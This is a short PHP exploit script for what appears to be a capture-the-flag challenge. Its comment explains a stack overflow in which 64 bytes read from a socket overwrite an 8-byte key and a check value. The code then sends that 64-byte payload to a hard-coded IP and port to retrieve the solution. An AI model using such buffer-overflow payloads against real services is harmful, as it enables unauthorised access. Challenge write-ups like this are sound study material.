<?php

/**
  The disassembly of the code shows that the program reads an 8-byte key from /dev/urandom
  into the address [rbp-30h]. After that, it reads 64 bytes from the socket and stores them
  at [rbp-40h], allowing us to overwrite the key. Then, the program compares the first 8 bytes
  from both strings:
    - If the strings differ, it prints an error message.
    - Otherwise, it compares [rbp-4h] with 0x00000001, for some reason, and prints an "Invalid key"
      message unless they are equal, in which case it sends the solution to the client.
      Since we have write access from [rbp-40h] to [rbp-01h], we can easily force the server
      to send us the solution by writing a 64-byte long payload.
*/

$ip = '52.49.91.111';
$port = '9999';

$sock = fsockopen($ip, $port);

// We will use 64 bytes made of 0x00000001's
$payload = str_repeat(chr(1).chr(0).chr(0).chr(0), 16);
fwrite($sock, $payload);

while (!feof($sock)) {
    echo $msg = fread($sock, 1024);
}